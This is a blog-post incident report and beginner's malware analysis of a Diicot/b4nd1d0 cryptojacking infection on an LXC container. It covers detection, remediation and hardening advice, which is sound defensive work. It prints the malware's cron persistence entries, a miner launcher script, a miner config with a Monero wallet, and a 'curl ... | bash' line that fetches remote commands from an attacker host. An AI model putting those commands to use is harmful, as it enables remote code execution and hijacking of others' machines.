---
layout: post
title: a beginner's analysis to b4nd1d0 and diicot malware.
date: 2024-09-29 16:10:00
description: How b4nd1d0 and diicot malwares works on a linux container
tags: malware
categories: malware
thumbnail: assets/img/thumbnail/virus.png
---

# Incident Report: Diicot Cryptojacking Campaign on an LXC Container

Malware remains one of the most destructive cyber-threats, endangering millions of computers and servers every day. In this case, one of the many servers we operate was compromised. What follows is my understanding of the attack, based on manual log analysis and some open-source research — this account may evolve as more evidence comes to light.

## Setup

- LXC container
- Public IP address
- Default credentials

The perfect recipe for disaster.

## Detection

The compromise was first flagged by an automated alert reporting abnormal SSH traffic directed at several Linux machines, along with a high volume of authentication errors.

The logs looked like this:

```
2024-09-25T06:11:27.008471+00:00 Linux03 sshd[490844]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=MY_IP  user=root
2024-09-25T06:11:28.679602+00:00 Linux03 sshd[490844]: Failed password for root from MY_IP port 36986 ssh2
2024-09-25T06:11:30.056913+00:00 Linux03 sshd[491084]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=MY_IP  user=root
...
```

These entries revealed an active SSH login brute-force attack *originating from our own server* and targeting another machine. Once we logged into the compromised host, inspection of the unprivileged `admin` account's history showed it had been used to attempt SSH logins against multiple external IP addresses under different usernames.

## Infection and Foothold

The attacker gained initial access by exploiting default credentials on the `admin` account (`admin:admin`). This account was not listed in `sudoers` and had only Docker installed. Lateral movement to root is unlikely, since the root account shows no signs of ever having been used by the attacker.

The intrusion pattern — automated credential-stuffing followed by rapid deployment of a cryptominer — is consistent with opportunistic, script-driven campaigns rather than a targeted, hands-on-keyboard attacker.

## Securing the Foothold (Persistence)

Persistence was established through a set of cron jobs:

```
crontab -l
@daily          /var/tmp/Documents/./.b4nd1d0
@reboot         /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
* * * * *       /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
@monthly        /var/tmp/Documents/./.diicot > /dev/null 2>&1 & disown
*/30 * * * *    /var/tmp/Documents/./.c > /dev/null 2>&1 & disown
```

*(Note: several entries were originally duplicated in the crontab — likely from repeated infection/re-registration attempts by the malware's own persistence logic.)*

- **`.b4nd1d0`** — launched on a daily schedule; responsible for starting the cryptominer process.
- **`.diicot`** — relaunched on every reboot and every minute; likely a watchdog/re-infection script ensuring the miner and C2 beacon stay alive.
- **`.c`** — polled an external server every 30 minutes for new commands.

Because each job used `disown`, the processes were detached from the shell's job table, so `jobs -l` returned nothing — a simple but effective way to stay invisible to a casual `jobs` check (a `ps aux` or `pgrep` scan would still have revealed them).

## Scope of the Attack

### Diicot

[Diicot](https://www.cadosecurity.com/blog/tracking-diicot-an-emerging-romanian-threat-actor) (formerly known as [Mexals](https://www.bitdefender.co.uk/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign/)) is a Romanian-linked cryptojacking campaign that targets poorly secured Linux distributions, typically via weak or default SSH credentials. It relies on Shell Script Compiler (SHC) to obfuscate its payloads and evade signature-based detection.

### `.b4nd1d0`

This script launches a process disguised under the name `Opera`, which is in fact the XMRig-based cryptocurrency miner:

```bash
#!/bin/bash
m1lbe1()
{
    if ! pgrep -x Opera >/dev/null
    then
        cd /var/tmp/Documents
        ./Opera >/dev/null 2>&1
    else
        exit 1
    fi
}
m1lbe1
```

It checks whether a process named `Opera` is already running; if not, it starts the miner. This prevents duplicate miner instances from competing for the same CPU resources.

### `.c`

This script functions as the campaign's command channel, periodically pulling and executing remote commands:

```bash
curl -s evil_pub_ip/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1 || \
curl -s diicot.xyz/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1
```

Note the fallback structure: if the primary IP-based endpoint is unreachable, it falls back to a domain (`diicot.xyz`), improving the malware's resilience against IP blocklisting.

### Miner Configuration (`config.json`)

The miner's configuration file (mislabeled `config.yaml` on disk, but actually JSON) defines the mining pool and wallet:

```json
{
    "tls-fingerprint": null,
    "daemon": false,
    "socks5": null,
    "self-select": null,
    "submit-to-origin": false,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "BadUrl:80",
            "user": "87Fxj6UDiwYchWbn2k1mCZJxRxBC5TkLJQoP9EJ4E9V843Z9ySeKYi165Gfc2KjxZnKdxCkz7GKrvXkHE11bvBhD9dbMgQe",
            "pass": "proxy2",
            "rig-id": "",
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ]
}
```

The `user` field is a Monero (XMR) wallet address — typical of XMRig-family miners, which favor Monero for its privacy properties.

## Remediation

1. **Kill active processes** — terminate the `Opera` (miner) process and any running `.diicot`/`.c` scripts before cleanup, so they can't respawn mid-remediation.
2. **Clear persistence** — remove all malicious entries from `crontab -e` (or `crontab -r` if the account has no legitimate jobs).
3. **Remove payloads** — delete the `/var/tmp/Documents` directory and its contents.
4. **Rotate credentials** — change the `admin` account password (and any other accounts using default/weak credentials) to a strong, unique password; consider disabling password auth in favor of SSH keys.
5. **Check for further compromise** — review `~/.ssh/authorized_keys`, installed packages, and running processes for anything else planted during the intrusion.
6. **Harden the container** — restrict SSH exposure (firewall/VPN/bastion), disable root login over SSH, and consider fail2ban or equivalent for brute-force protection.
7. **Rebuild if in doubt** — for a container this cheap to redeploy, rebuilding from a clean image is often faster and safer than fully trusting a cleaned host.

## Lessons Learned

- **Never use default credentials**, especially on internet-facing services. `admin:admin` is one of the first combinations any automated scanner will try.
- **Expose only what's necessary.** A container with a public IP and SSH open to the world is a standing invitation for exactly this kind of opportunistic attack.
- **Monitor outbound traffic, not just inbound.** This compromise was caught because the infected host was attacking *others* — inbound-only monitoring would likely have missed it for much longer.
- **`disown`'d processes still show up in `ps`.** Relying only on `jobs -l` to check for suspicious background activity is not sufficient.
